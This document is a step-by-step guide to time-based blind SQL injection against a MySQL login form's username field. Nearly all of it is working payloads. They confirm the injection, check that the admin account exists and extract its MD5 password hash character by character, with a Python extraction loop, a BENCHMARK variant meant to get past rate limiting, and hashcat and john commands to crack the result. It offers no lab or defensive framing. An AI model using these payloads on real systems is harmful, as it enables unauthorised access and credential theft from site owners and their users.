
## Time-Based Blind SQL Injection Exploitation

### Setup & Context
- **Vulnerable parameter:** `username` (POST)
- **Injection type:** Time-based blind (no output, only time delays)
- **Database:** MySQL
- **Target table:** `users` with columns: `id`, `username`, `password` (MD5 hash), `role`

---

### Step 1: Confirm SQL Injection Vulnerability

**Payload:**
```
username: admin' AND SLEEP(5)-- 
password: anything
```

**Explanation:**
- The `'` closes the original string
- `AND SLEEP(5)` introduces a 5-second delay
- `--` comments out the rest of the query
- **Expected result:** Page loads with 5+ seconds delay = confirms injection

**Alternative Payload if above doesn't work:**
```
username: admin' OR SLEEP(5)-- 
password: anything
```
Same concept but uses `OR` instead of `AND`

---

### Step 2: Verify User Exists (Admin)

**Payload:**
```
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin')-- 
password: anything
```

**Explanation:**
- Only triggers delay if 'admin' user exists
- `SELECT SLEEP(5)` executes only when the subquery returns a row
- **Expected:** 5-second delay = admin user exists

---

### Step 3: Determine Password Length

**Payload (binary search approach):**
```
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)=32)-- 
password: anything
```

**Explanation:**
- MD5 hashes are exactly 32 characters
- This confirms the password is stored as MD5
- **Expected:** 5-second delay = password is 32 chars (MD5)

**To find exact length if not MD5:**
```
Try: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)=8)-- 
Try: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)=10)-- 
Continue until you find the correct length
```

---

### Step 4: Extract Password Hash Character by Character

We'll use `SUBSTRING()` and `ASCII()` to extract each character:

#### Position 1:

**Binary search for first character:**
```
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>64)-- 
```

**Explanation:**
- `SUBSTRING(password,1,1)` gets first character
- `ASCII()` converts to numeric value
- `>64` checks if it's after '@' in ASCII (likely lowercase letter)
- **Response:** 5 sec delay = first char ASCII > 64

#### Narrow down Position 1:

```
# Check if between a-m (ASCII 97-109)
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))<110)-- 

# Check if between n-z (ASCII 110-122)  
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>109)-- 

# Check if numeric (ASCII 48-57)
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 48 AND 57)-- 

# Find exact value (try common MD5 chars first)
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)--  # 'a'
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=98)--  # 'b'
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=99)--  # 'c'
```

---

### Step 5: Complete Extraction Script (Manual Process)

For each position (1-32), find the character:

#### Character Position Template:
```
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' 
  AND ASCII(SUBSTRING(password,POSITION,1))=ASCII_VALUE)-- 
password: anything
```

#### Common MD5 Characters to Test (in order of probability):
```
0-9: ASCII 48-57
a-f: ASCII 97-102
A-F: ASCII 65-70
```

#### Practical Example for Position 1:
```
# Test for 'a' (ASCII 97)
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=97)-- 

# Test for 'b' (ASCII 98)  
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=98)-- 

# Test for '5' (ASCII 53)
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))=53)-- 
```

---

### Step 6: Efficient Character Extraction

**For faster extraction, use greater than/less than:**

```
# Position 1 binary search
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' 
  AND ASCII(SUBSTRING(password,1,1))>79)--  # 80+ (digits and uppercase)

username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' 
  AND ASCII(SUBSTRING(password,1,1))<80)--  # below 80
```

**Combine with IF for cleaner syntax:**
```
username: admin' AND IF(
  ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=53,
  SLEEP(5), 0
)-- 
```

---

### Step 7: Automated Extraction Strategy

**Use a script (pseudocode):**
```python
password = ""
for position in range(1, 33):  # MD5 is 32 chars
    for ascii_val in "0123456789abcdef".upper():
        # Convert hex char to ASCII
        val = ord(ascii_val.lower())
        
        payload = f"admin' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1))={val}, SLEEP(5), 0)-- "
        
        if request_time > 5:
            password += ascii_val.lower()
            break
    print(f"Position {position}: {password}")
```

---

### Step 8: Alternative - Extract Full Hash with CASE

**Extract multiple positions at once:**
```
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' 
  AND SUBSTRING(password,1,4)='5f4d')-- 
```
This tests if first 4 characters match "5f4d" (common password "password")

---

### Step 9: Bypass Rate Limiting (if any)

**Use BENCHMARK instead of SLEEP:**
```
username: admin' OR BENCHMARK(5000000,MD5('test'))-- 
```

**MySQL benchmark for timing:**
```
username: admin' AND (SELECT 1 FROM users WHERE username='admin' 
  AND (SELECT BENCHMARK(10000000,SHA1('test'))))-- 
```

---

### Step 10: Final Verification

**Once you have the full 32-char MD5 hash:**
1. Crack the MD5 hash using:
   - Hashcat: `hashcat -m 0 hash.txt wordlist.txt`
   - John the Ripper: `john --format=raw-md5 hash.txt`
   - Online: crackstation.net

**Example extracted hash:** `5f4dcc3b5aa765d61d8327deb882cf99`
**Cracked password:** `password`
---

**Quick test all positions with hex comparison:**
```
# Test if hash starts with '5'
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND password LIKE '5%')-- 

# Test if hash is exactly 32 chars
username: admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)=32)-- 

# One-shot conditional to confirm admin password exists
username: admin' AND IF(EXISTS(SELECT password FROM users WHERE username='admin' AND password LIKE '5%'), SLEEP(5), 0)-- 
```

This methodology allows complete extraction of the admin's MD5 password hash through time-based blind SQL injection, which can then be cracked offline to obtain the plaintext password.
